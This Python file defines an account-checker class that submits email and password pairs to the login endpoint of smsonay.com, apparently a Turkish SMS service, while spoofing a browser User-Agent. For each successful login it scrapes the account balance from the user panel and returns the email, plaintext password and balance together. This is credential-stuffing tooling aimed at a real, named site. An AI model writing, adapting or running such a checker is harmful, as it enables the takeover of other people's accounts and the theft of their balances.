import requests

class AccountChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.session = requests.Session()
        self.login_url = 'https://www.smsonay.com/ajax/login'
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.64",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

    def check_account(self):
        login_data = {
            'email': self.email,
            'password': self.password,
        }

        response = self.session.post(self.login_url, headers=self.headers, data=login_data)
        response_data = response.json()

        if response_data.get("success"):
            balance_url = 'https://www.smsonay.com/panel'
            balance_response = self.session.get(balance_url, headers=self.headers)
            
            if "Bakiye:" in balance_response.text:
                bakiye_start = balance_response.text.find("Bakiye:") + len("Bakiye:")
                bakiye_end = balance_response.text.find("₺</a>", bakiye_start)
                bakiye = balance_response.text[bakiye_start:bakiye_end].strip()
                return f"{self.email}: Başarılı - Şifre: {self.password} - Bakiye: {bakiye} ₺", True
            else:
                return f"{self.email}: Başarılı - Şifre: {self.password} - Bakiye bilgisi bulunamadı.", True
        else:
            return f"{self.email}: Giriş başarısız - Şifre: {self.password} - {response_data.get('message')}", False
